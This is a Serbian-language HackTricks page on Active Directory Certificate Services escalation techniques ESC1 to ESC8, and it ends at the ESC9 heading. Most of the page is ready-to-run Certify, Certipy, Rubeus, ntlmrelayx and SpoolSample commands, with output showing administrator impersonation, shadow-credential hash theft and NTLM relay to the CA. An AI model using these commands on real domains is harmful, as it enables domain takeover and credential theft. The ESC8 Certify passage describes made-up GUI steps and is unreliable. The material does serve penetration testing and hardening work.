# AD CS Domain Escalation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Ovo je sažetak sekcija o tehnikama eskalacije iz sledećih postova:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisane šablone sertifikata - ESC1

### Objašnjenje

### Pogrešno konfigurisane šablone sertifikata - ESC1 Objašnjeno

* **Prava za upisivanje su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.**
* **Odobrenje menadžera nije potrebno.**
* **Nisu potrebni potpisi od ovlašćenog osoblja.**
* **Sigurnosni deskriptori na šablonima sertifikata su preterano dozvoljavajući, omogućavajući korisnicima sa niskim privilegijama da dobiju prava za upisivanje.**
* **Šabloni sertifikata su konfigurisani da definišu EKU (Extended Key Usage) koji olakšavaju autentifikaciju:**
* Uključeni su identifikatori Extended Key Usage (EKU) kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili nema EKU (SubCA).
* **Omogućeno je da zahtevaoci uključe subjectAltName u Certificate Signing Request (CSR) šablonu:**
* Active Directory (AD) prioritetizuje subjectAltName (SAN) u sertifikatu za verifikaciju identiteta ako je prisutan. To znači da se specificiranjem SAN-a u CSR-u može zatražiti sertifikat za impersonaciju bilo kog korisnika (npr. administratora domena). Da li zahtevaoci mogu da specificiraju SAN je naznačeno u AD objektu šablona sertifikata putem svojstva `mspki-certificate-name-flag`. Ovo svojstvo je bit maska, a prisustvo zastavice `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` dozvoljava specificiranje SAN-a od strane zahtevaoca.

{% hint style="danger" %}
Konfiguracija koja je opisana omogućava korisnicima sa niskim privilegijama da zahtevaju sertifikate sa bilo kojim izabranim SAN-om, omogućavajući autentifikaciju kao bilo koji domenski princip preko Kerberos-a ili SChannel-a.
{% endhint %}

Ova funkcionalnost se ponekad omogućava radi podrške generisanju HTTPS ili host sertifikata "u letu" od strane proizvoda ili servisa za implementaciju, ili zbog nedostatka razumevanja.

Napomenuto je da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći šablon sertifikata (kao što je `WebServer` šablon, koji ima omogućenu `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zastavicu) duplicira, a zatim modifikuje da uključuje autentifikacioni OID.

### Zloupotreba

Da biste **pronašli ranjive šablone sertifikata** možete pokrenuti:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Da biste **zloupotrebili ovu ranjivost kako biste se predstavili kao administrator**, možete pokrenuti:

```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```

Zatim možete pretvoriti generisani **sertifikat u `.pfx`** format i koristiti ga za **autentifikaciju pomoću Rubeusa ili certipy** ponovo:

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows binarni fajlovi "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX fajla: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija šablona sertifikata unutar konfiguracione šeme AD Forest-a, posebno onih koji ne zahtevaju odobrenje ili potpis, koji poseduju Client Authentication ili Smart Card Logon EKU, i sa omogućenom zastavicom `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Pogrešno konfigurisani šabloni sertifikata - ESC2

### Objašnjenje

Drugi zloupotrebljeni scenario je varijacija prvog:

1. Prava za upisivanje su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.
2. Onemogućen je zahtev za odobrenje menadžera.
3. Izostavljen je zahtev za ovlašćenim potpisima.
4. Prekomerno dozvoljavajući bezbednosni deskriptor na šablonu sertifikata dodeljuje prava za upisivanje sertifikata korisnicima sa niskim privilegijama.
5. **Šablon sertifikata je definisan da uključuje Any Purpose EKU ili nema EKU.**

Any Purpose EKU dozvoljava da se sertifikat dobije od strane napadača za **bilo koju svrhu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda, itd. Ista **tehnika koja se koristi za ESC3** može se primeniti i za iskorišćavanje ovog scenarija.

Sertifikati **bez EKU-ova**, koji deluju kao sertifikati podređenih CA, mogu biti iskorišćeni za **bilo koju svrhu** i **takođe se mogu koristiti za potpisivanje novih sertifikata**. Stoga, napadač može specificirati proizvoljne EKU-ove ili polja u novim sertifikatima koristeći sertifikat podređenog CA.

Međutim, novi sertifikati kreirani za **autentifikaciju domena** neće funkcionisati ako sertifikat podređenog CA nije poveren od strane objekta **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može kreirati **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Ovi sertifikati mogu biti potencijalno **zloupotrebljeni** za razne svrhe (npr. potpisivanje koda, autentifikacija servera, itd.) i mogu imati značajne posledice za druge aplikacije u mreži poput SAML-a, AD FS-a ili IPSec-a.

Da bi se nabrojali šabloni koji odgovaraju ovom scenariju u konfiguracionoj šemi AD šume, može se pokrenuti sledeći LDAP upit:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Neskonfigurisani šabloni za agenta za upisivanje - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **različiti EKU** (Agent za zahtevanje sertifikata) i **2 različita šablona** (stoga ima 2 skupa zahteva).

EKU (OID 1.3.6.1.4.1.311.20.2.1) poznat kao **Agent za upisivanje** u Microsoft dokumentaciji, omogućava principalu da se **upiše** za **sertifikat** **umesto drugog korisnika**.

**"Agent za upisivanje"** upisuje se u takav **šablon** i koristi rezultujući **sertifikat za zajedničko potpisivanje CSR-a umesto drugog korisnika**. Zatim **šalje** zajednički potpisani CSR CA-u, upisuje se u **šablon** koji **dozvoljava "upisivanje umesto"**, a CA odgovara sa **sertifikatom koji pripada "drugom" korisniku**.

**Zahtevi 1:**

* Prava upisivanja su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.
* Zahtev za odobrenje menadžera je izostavljen.
* Nema zahteva za ovlašćenim potpisima.
* Bezbednosni opisnik šablona sertifikata je preterano dozvoljavajući, dodeljujući prava upisivanja korisnicima sa niskim privilegijama.
* Šablon sertifikata uključuje EKU za Agent za zahtevanje sertifikata, omogućavajući zahtevanje drugih šablona sertifikata umesto drugih principala.

**Zahtevi 2:**

* Enterprise CA dodeljuje prava upisivanja korisnicima sa niskim privilegijama.
* Zahtev za odobrenje menadžera je zaobiđen.
* Verzija šeme šablona je ili 1 ili prelazi 2, i specificira zahtev za izdavanje politike aplikacije koja zahteva EKU za Agent za zahtevanje sertifikata.
* EKU definisan u šablonu sertifikata dozvoljava autentifikaciju domena.
* Restrikcije za agente za upisivanje nisu primenjene na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za zloupotrebu ovog scenarija:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Korisnici** koji su ovlašćeni da **dobiju** sertifikat za agenta za upis, šablone u kojima su agenti za upis ovlašćeni da upišu i **nalozi** u ime kojih agent za upis može delovati mogu biti ograničeni od strane preduzeća CA. To se postiže otvaranjem `certsrc.msc` **snap-ina**, **desnim klikom na CA**, **klikom na Properties**, a zatim **navigiranjem** do kartice "Enrollment Agents".

Međutim, primećeno je da je **podrazumevana** postavka za CA "Ne ograničavaj agente za upis". Kada se ograničenje za agente za upis omogući od strane administratora, postavka se podešava na "Ograniči agente za upis", a podrazumevana konfiguracija ostaje izuzetno dozvoljavajuća. To omogućava pristup **svima** za upis u sve šablone kao bilo ko.

## Kontrola pristupa ranjivim šablonima sertifikata - ESC4

### **Objašnjenje**

**Bezbednosni deskriptor** na **šablonima sertifikata** definiše **dozvole** koje određeni **AD principali** poseduju u vezi sa šablonom.

Ukoliko **napadač** ima potrebne **dozvole** za **izmenu** šablona i **implementaciju** bilo kakvih **iskorišćivih konfiguracija** koje su opisane u **prethodnim sekcijama**, može se olakšati eskalacija privilegija.

Značajne dozvole koje se odnose na šablone sertifikata uključuju:

* **Vlasnik:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kojih atributa.
* **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kojih atributa.
* **WriteOwner:** Dozvoljava izmenu vlasnika objekta u principala koji je pod kontrolom napadača.
* **WriteDacl:** Omogućava prilagođavanje kontrola pristupa, potencijalno dodeljujući napadaču FullControl.
* **WriteProperty:** Ovlašćuje uređivanje bilo kojih svojstava objekta.

### Zloupotreba

Primer eskalacije privilegija kao prethodni:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 je kada korisnik ima privilegije za pisanje nad šablonom sertifikata. Na primer, to se može zloupotrebiti za prepisivanje konfiguracije šablona sertifikata kako bi se šablon učinio ranjivim na ESC1.

Kao što možemo videti u putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu vezu `AddKeyCredentialLink` sa `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, takođe sam implementirao i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo male snežne pahuljice Certipy-jeve komande `shadow auto` za dobijanje NT hash-a žrtve.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** može prebrisati konfiguraciju šablona sertifikata jednom komandom. Podrazumevano, Certipy će prebrisati konfiguraciju kako bi je učinio podložnom za ESC1. Takođe možemo navesti parametar `-save-old` da bismo sačuvali staru konfiguraciju, što će biti korisno za vraćanje konfiguracije nakon našeg napada.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Ranjiva kontrola pristupa ranjivog PKI objekta - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih odnosa zasnovanih na ACL-u, koja uključuje nekoliko objekata izvan šablona za sertifikate i autoriteta za sertifikate, može uticati na sigurnost celokupnog AD CS sistema. Ovi objekti, koji mogu značajno uticati na sigurnost, obuhvataju:

* AD objekat računara CA servera, koji može biti kompromitovan putem mehanizama poput S4U2Self ili S4U2Proxy.
* RPC/DCOM server CA servera.
* Svaki potomak AD objekta ili kontejner unutar specifične putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja uključuje, ali nije ograničena na, kontejnere i objekte poput kontejnera za šablone sertifikata, kontejnera za sertifikacione autoritete, objekta NTAuthCertificates i kontejnera za usluge upisa.

Sigurnost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojim od ovih ključnih komponenti.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema koja se raspravlja u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se dotiče implikacija zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako je opisano od strane Microsoft-a. Ova konfiguracija, kada je aktivirana na Autoritetu za sertifikate (CA), omogućava uključivanje **korisnički definisanih vrednosti** u **alternativno ime subjekta** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®-ja. Kao rezultat toga, ova odredba omogućava **napadaču** da se upiše putem **bilo kog šablona** postavljenog za **autentifikaciju** domena - posebno onih koji su otvoreni za upisivanje korisnika sa **niskim privilegijama**, poput standardnog korisničkog šablona. Kao rezultat toga, sertifikat može biti obezbeđen, omogućavajući napadaču da se autentifikuje kao administrator domena ili **bilo koja druga aktivna entitet** unutar domena.

**Napomena**: Pristup za dodavanje **alternativnih imena** u zahtev za potpisivanje sertifikata (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (nazvan "Name Value Pairs"), predstavlja **kontrast** od strategije iskorišćavanja SAN-ova u ESC1. Ovde se razlika nalazi u **načinu na koji se informacije o nalogu inkapsuliraju** - unutar atributa sertifikata, umesto unutar ekstenzije.

### Zloupotreba

Da bi se proverilo da li je podešavanje aktivirano, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ova operacija u osnovi koristi **udaljeni pristup registru**, stoga alternativni pristup može biti:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu otkriti ovu pogrešnu konfiguraciju i iskoristiti je:

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Da biste promenili ove postavke, pretpostavljajući da posedujete **administrativna prava domena** ili ekvivalentna prava, sledeću komandu možete izvršiti sa bilo koje radne stanice:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavica se može ukloniti pomoću:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

{% hint style="warning" %}
Nakon ažuriranja sigurnosti u maju 2022. godine, novo izdati **sertifikati** će sadržati **sigurnosno proširenje** koje uključuje **`objectSid` svojstvo zahtevaoca**. Za ESC1, ovaj SID se dobija iz određenog SAN-a. Međutim, za **ESC6**, SID odražava **`objectSid` zahtevaoca**, a ne SAN.\
Da bi se iskoristio ESC6, sistem mora biti podložan ESC10 (Slabe mapiranje sertifikata), koji prioritet daje **SAN-u nad novim sigurnosnim proširenjem**.
{% endhint %}

## Vulnerable Certificate Authority Access Control - ESC7

### Napad 1

#### Objašnjenje

Pristup kontroli za sertifikaciono telo se održava putem skupa dozvola koje regulišu rad CA. Ove dozvole se mogu videti pristupom `certsrv.msc`, desnim klikom na CA, izborom opcije Properties, a zatim navigiranjem do kartice Security. Dodatno, dozvole se mogu nabrojati korišćenjem PSPKI modula sa komandama kao što su:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Ovo pruža uvid u osnovna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja se odnose na uloge "administratora CA" i "upravitelja certifikatima" redom.

#### Zloupotreba

Imajući prava **`ManageCA`** na autoritetu za izdavanje certifikata, subjekt može daljinski manipulisati postavkama koristeći PSPKI. To uključuje prebacivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se omogućila specifikacija SAN-a u bilo kojem obrascu, što je ključni aspekt eskalacije domena.

Ovaj proces se može pojednostaviti korišćenjem cmdleta **Enable-PolicyModuleFlag** iz PSPKI-a, što omogućava modifikacije bez direktnog GUI interakcije.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva koji su u toku, efektivno zaobilazeći zaštitu "odobrenje upravitelja CA certifikata".

Kombinacija modula **Certify** i **PSPKI** može se koristiti za zahtevanje, odobravanje i preuzimanje certifikata:

```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Napad 2

#### Objašnjenje

{% hint style="warning" %}
U **prethodnom napadu** su korišćene dozvole **`Manage CA`** da bi se omogućila zastavica **EDITF\_ATTRIBUTESUBJECTALTNAME2** za izvođenje napada **ESC6**, ali ovo neće imati nikakav efekat dok god usluga CA (`CertSvc`) ne bude restartovana. Kada korisnik ima pravo pristupa `Manage CA`, korisniku je takođe dozvoljeno da **restartuje uslugu**. Međutim, to **ne znači da korisnik može da restartuje uslugu udaljeno**. Osim toga, **ESC6 možda neće raditi odmah** u većini ažuriranih okruženja zbog bezbednosnih ažuriranja iz maja 2022. godine.
{% endhint %}

Zbog toga je ovde predstavljen još jedan napad.

Preduslovi:

* Samo **`ManageCA` dozvola**
* **`Manage Certificates`** dozvola (može se dodeliti iz **`ManageCA`**)
* Šablon sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravom pristupa `Manage CA` _i_ `Manage Certificates` mogu **izdati neuspele zahteve za sertifikatima**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali **samo administratori** mogu se upisati u šablon. Dakle, **korisnik** može **zatražiti** upis u **`SubCA`** - što će biti **odbijeno** - ali će **kasnije biti izdato od strane menadžera**.

#### Zloupotreba

Možete **dodeliti sebi pravo pristupa `Manage Certificates`** dodavanjem vašeg korisnika kao novog službenika.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** šablon se može **omogućiti na CA** pomoću parametra `-enable-template`. Podrazumevano, `SubCA` šablon je omogućen.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Ako smo ispunili preduslove za ovaj napad, možemo početi **zahtevanjem sertifikata na osnovu `SubCA` šablona**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Sa našim **`Upravljaj CA` i `Upravljaj Sertifikatima`**, možemo zatim **izdati neuspeli zahtev za sertifikat** koristeći `ca` komandu i parametar `-issue-request <ID zahteva>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

I na kraju, možemo **dobiti izdati sertifikat** koristeći `req` komandu i parametar `-retrieve <ID zahteva>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

## NTLM preusmeravanje na AD CS HTTP krajnje tačke - ESC8

### Objašnjenje

{% hint style="info" %}
U okruženjima gde je instaliran **AD CS**, ako postoji ranjiva **web upisna krajnja tačka** i ako je objavljen barem jedan **šablon sertifikata** koji dozvoljava **upisivanje računara domena i autentifikaciju klijenta** (kao što je podrazumevani **`Machine`** šablon), postaje moguće da **bilo koji računar sa aktivnom uslugom spulera bude kompromitovan od strane napadača**!
{% endhint %}

AD CS podržava nekoliko **HTTP metoda upisa sertifikata**, koje su dostupne putem dodatnih serverskih uloga koje administratori mogu instalirati. Ove HTTP bazirane interfejse za upisivanje sertifikata je moguće napasti **NTLM preusmeravanjem**. Napadač, sa **kompromitovane mašine, može se predstavljati kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM-a**. Dok se predstavlja kao žrtveni nalog, napadač može pristupiti ovim web interfejsima da **zahteva sertifikat za autentifikaciju klijenta koristeći `User` ili `Machine` šablone sertifikata**.

* **Web upisni interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`), podrazumevano koristi samo HTTP, što ne pruža zaštitu od NTLM preusmeravanja. Osim toga, on eksplicitno dozvoljava samo NTLM autentifikaciju putem svoje Authorization HTTP zaglavlja, čime se onemogućava korišćenje sigurnijih metoda autentifikacije poput Kerberosa.
* **Servis za upisivanje sertifikata** (CES), **Servis za politiku upisivanja sertifikata** (CEP) i **Servis za upisivanje mrežnih uređaja** (NDES) podrazumevano podržavaju pregovaranje autentifikacije putem svojih Authorization HTTP zaglavlja. Pregovaranje autentifikacije **podržava i** Kerberos i **NTLM**, što omogućava napadaču da **smanji na NTLM** autentifikaciju tokom preusmeravanja. Iako ovi web servisi podrazumevano omogućavaju HTTPS, samo HTTPS **ne pruža zaštitu od NTLM preusmeravanja**. Zaštita od NTLM preusmeravanja za HTTPS servise je moguća samo kada se HTTPS kombinuje sa vezivanjem kanala. Nažalost, AD CS ne aktivira Proširenu zaštitu za autentifikaciju na IIS-u, što je potrebno za vezivanje kanala.

Uobičajeni **problem** sa NTLM preusmeravanjem je **kratko trajanje NTLM sesija** i nemogućnost napadača da komunicira sa servisima koji **zahtevaju NTLM potpisivanje**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM preusmeravanja da bi se dobio sertifikat za korisnika, jer period važenja sertifikata određuje trajanje sesije, a sertifikat se može koristiti sa servisima koji **zahtevaju NTLM potpisivanje**. Za uputstva o korišćenju ukradenog sertifikata, pogledajte:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Još jedno ograničenje NTLM preusmeravanja je da **napadačeva kontrolisana mašina mora biti autentifikovana od strane žrtvenog naloga**. Napadač može ili da sačeka ili da pokuša **prisiliti** ovu autentifikaciju:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify) `cas` nabraja **omogućene HTTP AD CS krajnje tačke**:

```
Certify.exe cas
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koristi se od strane preduzeća za čuvanje krajnjih tačaka usluge za upisivanje sertifikata (CES) od strane autoriteta za sertifikate (CA). Ove tačke mogu biti izlistane i analizirane korišćenjem alata **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

\`\`\`powershell Import-Module PSPKI Get-CertificationAuthority | select Name,Enroll\* | Format-List \* \`\`\` #### Zloupotreba sa Certify

Certify je alat koji se koristi za upravljanje digitalnim sertifikatima u Windows okruženju. Međutim, ovaj alat može biti zloupotrebljen za eskalaciju privilegija u domenu.

Da biste iskoristili ovu ranjivost, prvo morate dobiti pristup računaru sa instaliranim Certify alatom. Zatim možete izvršiti sledeće korake:

1. Pokrenite Certify alat i izaberite opciju za generisanje novog sertifikata.
2. Kada se otvori prozor za generisanje sertifikata, unesite ime i druge informacije za sertifikat.
3. Umesto da izaberete opciju za čuvanje sertifikata na lokalnom računaru, odaberite opciju za čuvanje na mrežnom resursu.
4. Unesite putanju do mrežnog resursa koji je dostupan samo administratorima domena.
5. Kliknite na dugme za generisanje sertifikata i sačekajte da se proces završi.
6. Kada se sertifikat generiše, Certify alat će pokušati da sačuva sertifikat na mrežnom resursu. Pošto nemate dozvolu za pristup mrežnom resursu, Certify alat će pokušati da se autentifikuje kao administrator domena.
7. Kada Certify alat pokuša da se autentifikuje kao administrator domena, biće poslati vaši autentifikacioni podaci. Ako su vaši autentifikacioni podaci ispravni, Certify alat će dobiti privilegije administratora domena.
8. Sada možete izvršavati privilegovane komande i imati potpunu kontrolu nad domenom.

Važno je napomenuti da ova zloupotreba Certify alata zahteva pristup računaru sa instaliranim alatom i autentifikacionim podacima koji imaju privilegije administratora domena.

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Zloupotreba sa [Certipy](https://github.com/ly4k/Certipy)

Zahtev za sertifikat se podrazumevano vrši pomoću Certipy-ja na osnovu šablona `Machine` ili `User`, određenog na osnovu toga da li ime naloga koji se prenosi završava sa `$`. Specifikacija alternativnog šablona može se postići korišćenjem parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) može se zatim koristiti za prinudu autentifikacije. Kada se radi sa kontrolerima domena, potrebno je navesti `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Bez proširenja sigurnosti - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

